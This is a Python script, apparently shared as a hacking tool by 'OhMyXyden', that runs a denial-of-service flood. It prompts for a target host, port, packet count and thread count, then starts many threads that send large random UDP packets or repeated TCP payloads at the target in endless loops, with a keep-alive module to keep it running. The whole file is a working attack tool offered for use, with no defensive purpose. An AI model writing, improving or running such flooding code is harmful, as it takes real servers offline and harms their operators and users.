#good script by OhMyXyden
import signal
import time
import socket
import random
from threading import Thread
import sys
import os
from os import system, name
import keep_alive

os.system("clear")
print("\033[1;34;40m Tools Ddos By : OhMyXyden\n" )
print("\033[0;31;40m 🅃🄾🄾🄻🅂 🄸🄽🄸 🄳🄸🄱🅄🄰🅃 🄾🄻🄴🄷 🄾🄷🄼🅈🅇🅈🄳🄴🄽\n") 
print(" > PASSWORD : Den ") 

Den = input()
if Den == "n":
	exit(0)
ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" Yuk Mari Kita DDOS Sayang?(y/n):"))
times = int(input(" PACKETS:"))
threads = int(input(" ISI PACKETS:"))
def run():
	data = random._urandom(10825)
	i = random.choice(("[ASSSALAMMUALAKUM]","[ASSSALAMMUALAKUM]","[ASSSALAMMUALAKUM]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #It's using the UDP method as you can see in SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr) 
			print(i +" DDOS BY OHMYXYDEN!!!")
		except:
			s.close()
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(10825)
	i = random.choice(("[ASSSALAMMUALAKUM]","[ASSSALAMMUALAKUM]","[ASSSALAMMUALAKUM]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #And here it's using the TCP method as you can see in SOCK_STREAM
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" DDOS BY OHMYXYDEN!!!")
		except:
			s.close()
			print("[*] SERVER DOWN!!!")

for y in range(threads):
	if choice == 'y':
		th = Thread(target = run)
		th.start()
	else:
		th = Thread(target = run2)
		th.start()

def new():
	for y in range(threads):
		if choice == 'y':
			th = Thread(target = run)
			th.start()
		else:
			th = Thread(target = run2)
			th.start()

keep_alive.keep_alive()